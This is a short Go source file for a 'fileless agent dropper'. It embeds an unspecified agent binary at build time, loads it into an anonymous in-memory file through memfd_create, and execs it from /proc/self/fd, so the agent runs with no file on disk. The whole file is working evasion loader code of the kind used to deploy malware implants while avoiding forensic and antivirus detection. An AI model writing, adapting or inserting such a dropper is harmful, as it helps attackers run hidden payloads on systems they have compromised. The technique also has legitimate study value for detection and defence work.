// SPDX-License-Identifier: MIT
//
// Fileless agent dropper.
// Embeds an agent binary at compile time and executes it from memory.
// The dropper process is replaced by the agent. No file on disk.
package main

import (
	_ "embed"
	"fmt"
	"os"

	"golang.org/x/sys/unix"
)

//go:embed agent
var agentBytes []byte

func main() {
	if err := execFromMemfd(agentBytes); err != nil {
		fmt.Fprintf(os.Stderr, "exec failed: %v\n", err)
		os.Exit(1)
	}
}

func execFromMemfd(bin []byte) error {
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return fmt.Errorf("memfd_create: %w", err)
	}

	if _, err := unix.Write(fd, bin); err != nil {
		unix.Close(fd)
		return fmt.Errorf("write: %w", err)
	}

	path := fmt.Sprintf("/proc/self/fd/%d", fd)

	return unix.Exec(path, []string{"agent"}, nil)
}
